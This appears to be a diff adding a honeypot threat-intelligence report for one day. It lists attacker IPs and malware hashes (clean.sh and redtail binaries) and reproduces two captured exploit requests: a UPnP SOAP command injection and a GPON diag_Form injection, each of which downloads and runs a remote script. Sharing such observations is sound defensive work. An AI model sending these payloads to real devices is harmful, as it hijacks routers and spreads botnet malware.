@@ -1,0 +1,55 @@
+Top 5 IPs for 25-08-2024 :
+
+159.65.3.130
+85.245.107.230
+172.174.5.146
+200.12.252.210
+98.191.174.10
+
+
+Malware Observed:
+
+File Name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File Name : redtail.arm7
+e92eaa9965b8a86c30a747608d7fc03162669968b4b9502f702556f34f478b64
+https://www.virustotal.com/gui/file/e92eaa9965b8a86c30a747608d7fc03162669968b4b9502f702556f34f478b64
+
+
+File Name : redtail.arm8
+a44fa76de8b63c049582c5737f52b6fd110c9303727223a157c51ca65f46645f
+https://www.virustotal.com/gui/file/a44fa76de8b63c049582c5737f52b6fd110c9303727223a157c51ca65f46645f
+
+
+File Name : redtail.i686
+ab208e7a71f904580068df494c6dcde60f1541ce1e999ea91d2aac8e3431285e
+https://www.virustotal.com/gui/file/ab208e7a71f904580068df494c6dcde60f1541ce1e999ea91d2aac8e3431285e
+
+
+File Name : redtail.x86_64
+44a2fbbdccad3afc19c443a4da8e144138a0ac8808d8ea8d32096dd493029d7a
+https://www.virustotal.com/gui/file/44a2fbbdccad3afc19c443a4da8e144138a0ac8808d8ea8d32096dd493029d7a
+
+Commands/exploits observed
+
+POST /UD/?9 HTTP/1.1
+User-Agent: luna-owns-you
+Content-Type: text/xml
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://37.221.92.196/w.sh; chmod 777 w.sh; sh w.sh; rm w.sh;`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
+
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0
+
